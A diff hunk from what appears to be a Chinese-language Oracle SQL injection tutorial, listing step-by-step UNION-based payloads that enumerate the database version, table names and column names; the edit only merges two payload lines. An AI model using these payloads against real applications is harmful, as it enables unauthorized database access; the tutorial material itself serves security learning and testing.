@@ -96,9 +96,7 @@ Oracle 的用户密码可以使用 john 或者 cain and abel 进行破解，加�
 `' union select null,(select banner from sys.v$version where rownum=1),null from dual --`
 
 **Step 5.**获取表名：
-`' union select null,(select table_name from user_tables where rownum=1),null from dual --`
-`' union select null,(select table_name from user_tables where rownum=1 and table_name<>'table_1'),null from dual --`
-
+`' union select null,(select table_name from user_tables where rownum=1),null from dual --``' union select null,(select table_name from user_tables where rownum=1 and table_name<>'table_1'),null from dual --`
 **Step 6.**获取列名：
 `' union select null,(select column_name from user_tab_columns where table_name='table_1' and rownum=1),null from dual --`
 `' union select null,(select column_name from user_tab_columns where table_name='table_1' and column_name<>'column_1' and rownum=1),null from dual --`
